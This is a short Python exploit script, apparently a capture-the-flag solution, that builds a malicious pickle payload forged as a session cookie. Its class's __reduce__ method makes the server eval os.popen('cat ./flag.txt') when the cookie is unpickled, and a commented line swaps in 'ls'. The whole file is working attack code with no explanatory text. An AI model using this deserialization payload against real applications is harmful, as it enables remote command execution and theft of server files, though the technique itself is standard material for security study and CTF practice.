import os
import base64
import pickle

# https://wikidocs.net/8929
# https://webcache.googleusercontent.com/search?q=cache:YOuyU55TjMIJ:https://hoppipolla0507.tistory.com/22&cd=7&hl=ko&ct=clnk&gl=jp


class exploit():
    def __reduce__(none):
       #payload = "os.popen('ls').read()"
        payload = "os.popen('cat ./flag.txt').read()"
        return (eval, (payload,))

session = {
    "name" : exploit(),
    "userid" : "attacker",
    "password" : "attacker"
}

sessionid = base64.b64encode(pickle.dumps(session)).decode("utf-8")
print(sessionid)
